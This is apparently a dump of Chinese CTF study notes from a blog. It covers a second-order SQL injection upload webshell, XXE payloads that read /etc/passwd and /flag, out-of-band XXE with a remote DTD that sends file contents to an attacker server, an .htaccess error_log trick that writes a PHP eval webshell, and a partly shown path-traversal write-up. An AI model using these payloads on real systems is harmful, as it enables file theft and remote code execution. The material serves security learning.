`filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);\n\n假如我们在上传文件时名字为&#39;,extension=&#39;&#39;,filename=&#39;ma.png.png拼接进语句中就会变成\nupdate `file` set `filename`=&#x27;ma.png&#x27;, `oldname`=&#x27;&#x27;,extension=&#x27;&#x27;,filename=&#x27;ma.png&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]\n\n这个操作看似仅仅是改名为ma.png，但是我们需要注意到的是，extension在此时被改为了空，也就是ma.png.png，在储存中变成了ma.png，这个时候我们只需要将ma.png的filename改为ma.php即可以php后缀的文件名储存了\n但是我又发现一个不切实际的地方，虽然在数库中ma.png的extention为空，但是在文件储存情况下可不是这样\n注意在这里有个坑，这里改名的时候检查了文件是否存在：if(file_exists($oldname)) 我虽然通过注入修改了filename的值，但我upload目录下上传的文件名是没有改的。 因为利用注入时将extension改为空了，那么实际上数据库中的filename总比文件系统中真实的文件名少一个后缀。 那么这里的file_exists就验证不过。这里可以通过再次上传一个新文件，这个文件名就等于数据库里的filename的值就即可绕过。 所以最后整个getshell的流程，实际上是一个二次注入+二次操作getshell。\n$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];//这里加上了原来的extexsion，这也就是为什么数据库中名字改了但是回显名字没改if (file_exists($oldname)) &#123;\trename($oldname, $newname);//只有在进过file_exit的时候文件名才会改变&#125;\n\n也就是说为了绕过file_exit()，我们需要再上传一个ma.png，这个时候文件中就存在ma.png了，在数据库中新上传的文件名则是ma\n这个时候我们再改名，将ma.png改为ma.php，于是就出现\n$oldname = UPLOAD_DIR .&#x27;ma.png&#x27;;$newname = UPLOAD_DIR . &#x27;ma.php&#x27;;//这里加上了原来的extexsion，这也就是为什么数据库中名字改了但是回显名字没改if (file_exists($oldname)) &#123;\trename($oldname, $newname);//只有在进过file_exit的时候文件名才会改变&#125;//于是在最后改名的时候会将我们刚上传的ma.png改为ma.php\n\n\n\n第一步，上传二次注入文件\n我们上传一个文件名为&#39;,extension=&#39;&#39;,filename=&#39;ma.png.png\n第二步，对其进行改名，使其数据库中extention为空\n\n\n这次可以改变，但是不能和数据库中一样不存在extension\n第三步，上传一个ma.png的图片马，作为等下改名的shell\n第四步，对ma.png改名为ma.php\n由于实际储存在文件中的是有shell的ma.png，改名会将shell改为ma.php\n\n\n最后用蚁剑连接即可\n\n\n\n\n这是实际上的文件图\n\n"},{"title":"XML","url":"/2025/05/16/XML/","content":"XML学习笔记前言好久没写这种知识点的笔记了，本来以为xml文件挺简单的，但是发现还是有必要写笔记来总结一下。要学的不仅是xml文件，还有xpath注入等和xml有关的知识点\n1.XML简介简单了解XML：\n\nXML 指可扩展标记语言（EXtensible Markup Language）\nXML 是一种标记语言，很类似 HTML\nXML 被设计为传输和存储数据，其焦点是数据的内容 XML 被设计用来结构化、存储以及传输信息\nXML 允许创作者定义自己的标签和自己的文档结构\n\n语法：\n\nXML元素都必须有关闭标签。\n\nXML 标签对大小写敏感。\n\nXML 必须正确地嵌套。\n\nXML 文档必须有根元素。\n\nXML 的属性值须加引号。\n\n\n结构：\n\nXML 文档声明，在文档的第一行\nXML 文档类型定义，即DTD，XXE 漏洞所在的地方\nXML 文档元素\n\nxml文件只是一个储存文件且语法格式类似html的文件而已，我们主要利用XXE漏洞的地方是DTD文件\n2.DTD文档类型定义（DTD）：可以合法的XML文档构建模块，可以被声明在XML的文档中，也可以作为一个外部的引用。这里也就是XXE存在的地方。\nDTD 主要由以下部分组成：\n\n元素声明（&lt;!ELEMENT&gt;）：定义 XML 元素及其子元素结构\n属性声明（&lt;!ATTLIST&gt;）：定义元素的属性及其类型\n实体声明（&lt;!ENTITY&gt;）：定义可复用的文本或特殊字符\n注释（&lt;!-- --&gt;）：用于解释 DTD 规则\n\nDTD 可以 内嵌在 XML 文档中，也可以 单独存储为外部文件。\n内部DTD\n直接在xml文件中定义\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE bookstore [  &lt;!-- 声明 DTD，根元素是 bookstore --&gt;  &lt;!ELEMENT bookstore (book+)&gt;  &lt;!-- bookstore 必须包含至少一个 book --&gt;  &lt;!ELEMENT book (title, author, price)&gt;  &lt;!-- book 必须包含 title, author, price --&gt;  &lt;!ELEMENT title (#PCDATA)&gt;  &lt;!-- title 是纯文本 --&gt;  &lt;!ELEMENT author (#PCDATA)&gt;  &lt;!-- author 是纯文本 --&gt;  &lt;!ELEMENT price (#PCDATA)&gt;  &lt;!-- price 是纯文本 --&gt;  &lt;!ATTLIST book category CDATA #IMPLIED&gt;  &lt;!-- book 可以有一个可选的 category 属性 --&gt;]&gt;&lt;bookstore&gt;  &lt;book category=&quot;programming&quot;&gt;    &lt;title&gt;XML Basics&lt;/title&gt;    &lt;author&gt;John Doe&lt;/author&gt;    &lt;price&gt;29.99&lt;/price&gt;  &lt;/book&gt;&lt;/bookstore&gt;\n\n外部DTD\nDTD 存储在单独的文件（如 bookstore.dtd）中，并在 XML 中引用：\nbookstore.dtd\n&lt;!ELEMENT bookstore (book+)&gt;&lt;!ELEMENT book (title, author, price)&gt;&lt;!ELEMENT title (#PCDATA)&gt;&lt;!ELEMENT author (#PCDATA)&gt;&lt;!ELEMENT price (#PCDATA)&gt;&lt;!ATTLIST book category CDATA #IMPLIED&gt;\n\nxml文件引用DTD\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE bookstore SYSTEM &quot;bookstore.dtd&quot;&gt;&lt;bookstore&gt;  &lt;book category=&quot;programming&quot;&gt;    &lt;title&gt;XML Basics&lt;/title&gt;    &lt;author&gt;John Doe&lt;/author&gt;    &lt;price&gt;29.99&lt;/price&gt;  &lt;/book&gt;&lt;/bookstore&gt;\n\n这里面的DOCTYPE实际上是用来指定根元素的\n通过STSTEM后面的路径引入DTD文件是XXE漏洞的主要利用形式，外部引入其实就想到与php中的include，进行文件包含。我们可以利用xml加载DTD文档进行文件读取\nDTD语法\nDTD文档的声明及引用有三种：    内部DTD文档：        &lt;!DOCTYPE  根元素[定义元素属性等等内容]&gt;    外部DTD文档：        &lt;!DOCTYPE 根元素  SYSTEM &#x27;DTD文件路径&#x27;&gt;    内外部DTD文档结合：        &lt;!DOCTYPE 根元素  SYSTEM &#x27;DTD文件路径&#x27;[定义元素属性等等内容]&gt;\n\n(1) 元素声明 &lt;!ELEMENT&gt;\n定义 XML 元素的结构：\n\n**#PCDATA**：表示纯文本（Parsed Character Data）\n**(child1, child2)**：定义子元素的顺序\n**|**：表示“或”（只能选其中一个）\n**?**：可选（0 或 1 次）\n**\\***：0 次或多次\n**+**：1 次或多次\n\n&lt;!ELEMENT person (name, age?, email*)&gt;  &lt;!-- name 必须，age 可选，email 可多个 --&gt;&lt;!ELEMENT name (#PCDATA)&gt;  &lt;!-- name 是纯文本 --&gt;&lt;!ELEMENT age (#PCDATA)&gt;  &lt;!-- age 是纯文本 --&gt;&lt;!ELEMENT email (#PCDATA)&gt;  &lt;!-- email 是纯文本 --&gt;\n\n这下好像有点看懂DTD了\n(2) 属性声明 &lt;!ATTLIST&gt;\n定义元素的属性：\n\n**CDATA**：文本类型\n**ID**：唯一标识符\n**IDREF**：引用另一个元素的 ID\n**(val1|val2)**：枚举值\n**#REQUIRED**：必须提供\n**#IMPLIED**：可选\n**#FIXED &quot;value&quot;**：固定值\n\n&lt;!ATTLIST book  id ID #REQUIRED  &lt;!-- id 必须唯一 --&gt;  category (fiction|non-fiction) #IMPLIED  &lt;!-- category 可选，只能是 fiction 或 non-fiction --&gt;  lang CDATA #FIXED &quot;en&quot;  &lt;!-- lang 固定为 &quot;en&quot; --&gt;&gt;\n\n(3) 实体声明 &lt;!ENTITY&gt;\n定义可复用的文本或特殊字符：\n\n内部实体：在 DTD 中定义\n外部实体：引用外部文件\n\n&lt;!ENTITY company &quot;ACME Inc.&quot;&gt;  &lt;!-- 定义内部实体 --&gt;&lt;!ENTITY copyright &quot;© 2023 &amp;company;&quot;&gt;  &lt;!-- 引用另一个实体 --&gt;&lt;!ENTITY logo SYSTEM &quot;logo.svg&quot;&gt;  &lt;!-- 引用外部文件 --&gt;\n\nDTD之间原来也是可以进行包含的吗\n3.DTD实体定义虽然在前面介绍了实体，但是实体的种类很多，是无法直接讲完的，不同于元素和属性，这个做题好像要用到\nDTD（Document Type Definition）中的 实体（ENTITY） 用于定义可重用的数据块，类似于变量或宏。实体可以存储文本、特殊字符，甚至引用外部文件。在 XML 解析时，实体会被替换为其定义的内容。\n1. 实体的分类\nDTD 实体主要分为以下几类：\n\n\n\n类型\n说明\n示例\n\n\n\n内部实体\n在 DTD 内部定义的文本\n&lt;!ENTITY name &quot;value&quot;&gt;\n\n\n外部实体\n引用外部文件或 URL\n&lt;!ENTITY name SYSTEM &quot;file.txt&quot;&gt;\n\n\n参数实体\n仅在 DTD 内部使用（以 % 开头）\n&lt;!ENTITY % name &quot;value&quot;&gt;\n\n\n预定义实体\nXML 内置的特殊字符（如 &lt;, &amp;）\n&lt; 代表 &lt;\n\n\n在xml引用的时候需要在实体名前面添加&amp;\n内部实体\n&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;&lt;!ENTITY company &quot;ACME Inc.&quot;&gt;&lt;!ENTITY copyright &quot;© 2023 &amp;company;&quot;&gt;在xml中使用&lt;footer&gt;&amp;copyright;&lt;/footer&gt;输出结果&lt;footer&gt;© 2023 ACME Inc.&lt;/footer&gt;\n\n\n\n外部实体\n就是从外部引用的实体\n&lt;!ENTITY 实体名 SYSTEM &quot;文件路径或URL&quot;&gt;引用本地文件&lt;!ENTITY secret SYSTEM &quot;file:///etc/passwd&quot;&gt;引用远程 URL&lt;!ENTITY website SYSTEM &quot;https://example.com/data.txt&quot;&gt;\n\n\n\n参数实体\n参数实体仅用于 DTD 内部，不能直接在 XML 中使用。它们以 % 开头，通常用于定义可复用的 DTD 规则。\n&lt;!ENTITY % 实体名 &quot;实体值&quot;&gt;&lt;!ENTITY % person &quot;(name, age, email)&quot;&gt;&lt;!ELEMENT employee %person;&gt;&lt;!ELEMENT student %person;&gt;&lt;!ELEMENT employee (name, age, email)&gt;&lt;employee&gt; 元素必须包含且仅包含 &lt;name&gt;、&lt;age&gt; 和 &lt;email&gt; 三个子元素，且必须按照这个顺序出现。&lt;!ELEMENT student (name, age, email)&gt;\n\n这个参数实体就像一个专门在DTD使用的变量，只要出现了就会加载后面的值，如果引入了外部文件也会直接加载出来\n预定义实体\nXML 内置了 5 个预定义实体，用于转义特殊字符：\n不知道为什么，md文件中会把预定义实体进行解码，只能用图片来看看了\n\n\n&lt;code&gt;if (x &amp;lt; 10) &#123; ... &#125;&lt;/code&gt;&lt;code&gt;if (x &lt; 10) &#123; ... &#125;&lt;/code&gt;\n\n\n\n外部实体和外部DTD的区别\n我们需要区分一下外部实体和外部DTD，这个都是从外部包含\n我们先来看下最简单的payload\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [        &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;定义了一个外部实体 flag，它指向 /flag 文件。]&gt;&lt;root&gt;    &lt;ctfshow&gt;&amp;flag;&lt;/ctfshow&gt;内部引用flag读取/flag&lt;/root&gt;\n\n这个是通过外部实体进行包含文件，被解析后会储存在数组的data中\n但是外部DTD则是用来包含其他DTD文件\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE bookstore SYSTEM &quot;bookstore.dtd&quot;&gt;&lt;bookstore&gt;  &lt;book category=&quot;programming&quot;&gt;    &lt;title&gt;XML Basics&lt;/title&gt;    &lt;author&gt;John Doe&lt;/author&gt;    &lt;price&gt;29.99&lt;/price&gt;  &lt;/book&gt;&lt;/bookstore&gt;\n\n这个估计不能用来读取文件\n后面还有不会的遇到再学吧\n4.Payload1.直接读取数据&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n通过通用实体回显flag\n2.XXE漏洞外带数据我们之前做题都是通过会回显xml文档中的变量导致文件内容输出，但是如果靶机不会回显xml变量，我们就需要外带数据\npayload\n目标机\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.84:1999/file.dtd&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;\n\n我们对目标机先设置file参数指向flag，然后再通过远程加载我们的恶意dtd文件\nVPS搭载恶意dtd文件\n&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://10.88.15.84:7777/%file;&#x27;&gt;&quot;&gt;\n\n我们都知道xml的参数需要在后面%file的时候才会加载，这也就是为什么我们不能通过远程加载dtd文件后面直接跟上%file这个时候还是字符串\n要远程加载all的原因就是那种写法是违规了，我们利用远程加载dtd的方式绕过，然后通过通用实体send引用的时候在dtd外部file也进行了加载，可以利用外部加载实体的方式进行发包外带\n这是因为在内部DTD中，参数实体不能用于定义其他通用实体\n&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://example.com/%file;&#x27;&gt;&quot;&gt;  &lt;!-- 这里违规！ --&gt;%all;  &lt;!-- 在内部DTD中，%all不能包含ENTITY定义 --&gt;]&gt;\n\n然后就是为什么不这样写\n&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY send SYSTEM &#x27;http://10.88.15.84:7777/%file;&#x27;&gt;\n\nxml参数在引用的时候才会加载，如果这样写发送过去的就是%file，但是在外部实体中是在dtd外部了，dtd外部就不会出现这种未加载的情况，也就是我们需要让目标通过访问我们的外部实体，然后在dtd外部中加载file\n"},{"title":"[XNUCA2019Qualifier]EasyPHP","url":"/2025/05/20/XNUCA2019Qualifier-EasyPHP/","content":"[XNUCA2019Qualifier]EasyPHP&lt;?php    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    include_once(&quot;fl3g.php&quot;);    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\\nJust one chance&quot;); \n\n好多版本的EasyPHP，就连代码都和羊城杯的那个EasyPHP差不多，那羊城杯的那个payload甚至可以直接梭哈，但是这个题目那个payload是非预期解，这题又学到了\n非预期解1\n先把可以直接梭哈的payload放出来\n?content=php_value auto_prepend_fi\\%0ale .htaccess%0a%23&lt;?php system(&#x27;ls&#x27;);?&gt;\\&amp;filename=.htaccess\n\n为什么可以已经在之前的题目里面写过了\n预期解\n这个题目一开始也是想直接利用index.php写一句话木马，但是肯定是不行的。但是在看别人博客的时候，好像找到了原因\n\n\n设定了只能访问目录下的index.php时PHP引擎才会开启\n\nphp_admin_flag engine off\n在全局 VirtualHost 中禁用 PHP 引擎，意味着：\n访问 /var/www/html 下的普通文件（如 .html、.txt）时，不会触发 PHP 解析。\n如果直接访问 .php 文件（如 /test.php），会返回 PHP 源代码（而非执行），因为 PHP 引擎被关闭。\n\n\n\n\n&lt;Location /index.php&gt; 中的例外\n当访问 /index.php 时，单独启用 PHP 引擎（php_admin_flag engine on）。\n这样只有 index.php 能被正常解析，其他 .php 文件仍会被当作普通文本。\n\n\n\n但这也不应该是不能往index.php中写马的原因，搞不好是在后面添加了那句话的原因。看了一下解释，突然明白了，服务器怎么可能让你向一个web服务器正在使用到文件进行写入，感觉自己好傻逼啊\n于是我们只能使用.htaccess文件\n.htaccess中可以配置部分apache指令，这部分指令不需要重启服务端就能生效，利用.htaccess实际上就是利用apache中那些.htaccess有权限配置的指令。\n也就是权限为下图中两者的指令。\n\n\n这里师傅们找到了error_log指令，可以用来写文件。\n\n\n error_log是依靠出现错误来触发写日志的，所以最好让error_log把所有等级的错误均写成日志，这样方便我们写入，而error_reporting就能设置写日志需要的错误等级。\n\n\n其中当参数为32767时，表示为所有等级的错误。\n\n\n那如何控制我们写如的内容呢？显然是通过报错，这里师傅们采用的是修改include函数的默认路径。使用include_path去修改默认路径\n\n\n 在include函数中我们可以直接include(“当前目录下文件名”)来使用就是因为定义了默认路径为”.&#x2F;“即当前目录，如果把这个值修改为不存在的路径时，include包含这个路径便会报错。\n\n\n像这样的错误信息便会被写入文件，如果把phpcode换一句话，便能够扩大使用面。\n最后我们还需要注意我们写入时，写入的内容会接上”\\nJust one chance”，在.htaccess中出现不符合的apache语法的字符时会导致错误，这时我们访问在这个错误.htaccess作用范围内的页面均会返回500。\n这个绕过方法在之前就使用过了，只有一次机会，语法错了靶机就无了\n最后我们来解析一下payload\n\n\n在apache中#代表单行注释符 ，而\\代表命令换行，所以我们可以在末尾加上#\\，这个时候虽然换行但仍能被注释，效果如下图。\n\n\n当include_path指向不存在路径的时候就会报错，然后后面的error_log又会将报错信息指向fl3g.php，最后那一行则是包含所有报错信息\n我们只需要在include_path中写好一句话木马然后用蚁剑连接fl3g.php即可\n值得注意的是经过不完全测试发现仅三个目录有增删文件的权限，这三个目录分别是&#x2F;tmp&#x2F;、&#x2F;var&#x2F;tmp&#x2F;和&#x2F;var&#x2F;www&#x2F;html&#x2F;(即我们当前储存PHP代码的文件夹)，其他目录由于没有增删文件的权限所以我们error_log也因无法在这些目录下创建日志文件而失效(对于tmp文件夹或许是出于临时储存的需求所以需要的权限较低?并没有找到关于这点相关资料，但看师傅们都选择了&#x2F;tmp&#x2F;)。\nphp_value include_path &quot;/&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;php_value error_log &quot;/tmp/fl3g.php&quot;php_value error_reporting 32767#/\n\n/tmp/虽然是用来储存临时文件的，但是不同的配置有不同的结果，一般是在重启的时候才会清空\npayload\n?content=php_value%20include_path%20%22%2F%3C%3Fphp%20eval(%24_POST%5B&#x27;cmd&#x27;%5D)%3B%3F%3E%22%0Aphp_value%20error_log%20%22%2Ftmp%2Ffl3g.php%22%0Aphp_value%20error_reporting%2032767%0A%23%2F&amp;filename=.htaccess\n\n\n\n"},{"title":"XXE","url":"/2025/03/27/XXE/","content":"XXE学习笔记前言最近天气炎热，但是感觉不错，比冬天的时候好太多了。夏天也马上就要到了，虽然距离高考只有短短72天了，但是我只想说大一爱看。做题现在也开始遇到XXE了，可以学一下，避免后面来补\n1.XXE漏洞原理XXE：全称为XML Enternal Entity Injection，中文名称：XML外部实体注入。\n漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。\n特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。\nContent-type:text/xml application/xml\n\n我们先来了解一下XML\n简单了解XML：\nXML 指可扩展标记语言（EXtensible Markup Language）XML 是一种标记语言，很类似 HTMLXML 被设计为传输和存储数据，其焦点是数据的内容 XML 被设计用来结构化、存储以及传输信息XML 允许创作者定义自己的标签和自己的文档结构语法：\nXML元素都必须有关闭标签。XML 标签对大小写敏感。XML 必须正确地嵌套。XML 文档必须有根元素。XML 的属性值须加引号。结构：\nXML 文档声明，在文档的第一行XML 文档类型定义，即DTD，XXE 漏洞所在的地方XML 文档元素\nDTD\n文档类型定义（DTD）：可以合法的XML文档构建模块，可以被声明在XML的文档中，也可以作为一个外部的引用。这里也就是XXE存在的地方。\nDTD文档的三种格式：\n1.内部DTD文档&lt;!DOCTYPE 根元素[定义内容]&gt; 2.外部DTD文档&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; 3.内外部DTD文档结合&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;\n\n内部实体\n内部实体几乎没有什么利用价值\n&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 例如：&lt;!DOCTYPE foo [\t&lt;!ELEMENT foo ANY &gt;\t&lt;!ENTITY xxe &quot;hello&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n外部实体\n有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以利用如下协议file:///path/to/file.exthttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php  例如:&lt;!DOCTYPE foo [\t&lt;!ELEMENT foo ANY &gt;\t&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd中的内容&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;\n\n%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在&lt;foo&gt;&lt;&#x2F;foo&gt;中。\n2.XXE漏洞利用XXE 和 SQL注入 的攻击方法也有一点相似，也分有回显和没有回显\n有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据\n我们主要使用的就是xml中引用外部文件时，我们可以通过更改路径去让其访问我们需要的文件\n&lt;!DOCTYPE foo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n1.文件读取有回显\n&lt;?php$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);print_r((string)$xml);//有回显?&gt;\n\nsimplexml_load_string()解析接收过来的XML代码\npayload:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:///D://1.txt&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\n\n\n3.ctfshow真的说，学这个就是为了打ctf，要学的东西真的好多啊\n1.373关  有回显第一次看源代码，先解释一下\nerror_reporting(0);libxml_disable_entity_loader(false);//启用外部实体加载$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();//创建DOM文档对象，同时这个变量也可以储存xml提供了容器    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//通过loadXML，将字符串转化为xml，也可以加载本地文件，也是我们读取本地文件的破绽    $creds = simplexml_import_dom($dom);//通过simplexml_import_dom()将将DOM对象转换为SimpleXML对象    $ctfshow = $creds-&gt;ctfshow;//获取ctfshow节点的值    echo $ctfshow;&#125;highlight_file(__FILE__); \n\n分析下来就是，这个代码实现了读取xml字符串并将其转化为SimpleXML对象，通过访问对象内属性实现提取\n第一题，当然是抄的payload:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [        &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;定义了一个外部实体 flag，它指向 /flag 文件。]&gt;&lt;root&gt;    &lt;ctfshow&gt;&amp;flag;&lt;/ctfshow&gt;内部引用flag读取/flag&lt;/root&gt;\n\n2.374关 无回显error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); \n\n这个题目的特征就是没有输出语句，所以这需要我们利用其加载外部文件的特性去将读取内容外带到云服务器上\n首先我们先写一个XXE.php去获取flag\n&lt;?php$content = $_GET[&#x27;1&#x27;];//通过GET请求来拿到flag并储存到文件当中if(isset($content))&#123;              file_put_contents(&#x27;flag.txt&#x27;,&#x27;更新时间:&#x27;.date(&quot;Y-m-d H:i:s&quot;).&quot;\\n&quot;.$content);&#125;else&#123;              echo &#x27;no data input&#x27;;&#125;\n\n然后我们需要再写一个XXE.dtd去发送flag到XXE.php\n&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://118.31.168.4:1994/XXE.php?data=%data;&#x27;&quot;&gt;%all;\n\n云服务器部署好以后我们还需要，让目标服务器去读取我们的XXE.dtd文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [        &lt;!ELEMENT root ANY &gt;        &lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;        &lt;!ENTITY % dtd SYSTEM &quot;http://118.168.31.4:1994/XXE.php&quot;&gt;        %dtd;        %send;        ]&gt;&lt;root&gt;&lt;/root&gt;\n\n% file通过php伪协议去拿到&#x2F;flag，再通过访问% aaa去包含XXE.dtd。包含了之后XXE.dtd再通过url传递&#x2F;flag\n"},{"title":"XYCTF2025_复现","url":"/2025/09/23/XYCTF2025-%E5%A4%8D%E7%8E%B0/","content":"XYCTF2025这个还是在大一下学期打的比赛，当时一个题目都不会写，现在来看了一下好像还是一个题目都不会写\nwebSignin题目给了源码，直接来看下\n# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   main.py@Time    :   2025/03/28 22:20:49@Author  :   LamentXU &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;flag in /flag_&#123;uuid4&#125;&#x27;&#x27;&#x27;from bottle import Bottle, request, response, redirect, static_file, run, routewith open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:    secret = f.read()app = Bottle()@route(&#x27;/&#x27;)def index():    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;@route(&#x27;/download&#x27;)def download():    name = request.query.filename    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\\\&#x27; in name:        response.status = 403        return &#x27;Forbidden&#x27;    with open(name, &#x27;rb&#x27;) as f:        data = f.read()    return data@route(&#x27;/secret&#x27;)def secret_page():    try:        session = request.get_cookie(&quot;name&quot;, secret=secret)        if not session or session[&quot;name&quot;] == &quot;guest&quot;:            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;            response.set_cookie(&quot;name&quot;, session, secret=secret)            return &#x27;Forbidden!&#x27;        if session[&quot;name&quot;] == &quot;admin&quot;:            return &#x27;The secret has been deleted!&#x27;    except:        return &quot;Error!&quot;run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)\n\n代码很简单，就是一个文件读取路由和一个登录路由，根据做题经验，我们需要通过文件读取到secret然后利用密钥去伪造session进入下一步，我们先来看文件读取路由\nwith open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:    secret = f.read()   #从secret.txt中读取secret@route(&#x27;/download&#x27;)def download():    name = request.query.filename    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\\\&#x27; in name:        response.status = 403        return &#x27;Forbidden&#x27;    with open(name, &#x27;rb&#x27;) as f:        data = f.read()    return data\n\n这个过滤一开始看的时候感觉没毛病，但是仔细一看好鸡肋啊，他并不是直接过滤掉了目录穿越符，而是过滤了../../，然后就是不准使用绝对路径和不能../开头，这个通过./就很容易绕过\n/download?filename=./.././../secret.txt\n\n成功拿到\nHell0_H@cker_Y0u_A3r_Sm@r7\n\n\n\n我们接下来访问secret路由获取session\n@route(&#x27;/secret&#x27;)def secret_page():    try:        session = request.get_cookie(&quot;name&quot;, secret=secret)        if not session or session[&quot;name&quot;] == &quot;guest&quot;:            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;            response.set_cookie(&quot;name&quot;, session, secret=secret)            return &#x27;Forbidden!&#x27;        if session[&quot;name&quot;] == &quot;admin&quot;:            return &#x27;The secret has been deleted!&#x27;    except:        return &quot;Error!&quot;\n\n但是不知道为什么拿到的是这个\n&quot;!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu&quot;\n\n看了题解后才知道，这个用的是bottle框架，我之前看的都是flask的session伪造，难怪即使伪造session为admin也没有什么用，看来需要利用某个方法的漏洞了\n我们找到get_cookie方法的底层代码\ndef get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):    &quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the        `secret` must match the one used to create the cookie (see        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing        cookie or wrong signature), return a default value. &quot;&quot;&quot;    value = self.cookies.get(key)    if secret:        # See 